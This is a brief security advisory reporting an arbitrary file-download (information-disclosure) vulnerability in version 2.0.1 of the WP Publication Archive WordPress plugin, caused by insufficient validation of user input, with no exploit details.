The WP Publication Archive Plugin for WordPress is prone to an information-disclosure vulnerability because it fails to sufficiently validate user-supplied data.

An attacker can exploit this issue to download arbitrary files from the affected application. This may allow the attacker to obtain sensitive information; other attacks are also possible.

WP Publication Archive 2.0.1 is vulnerable; other versions may also be affected.
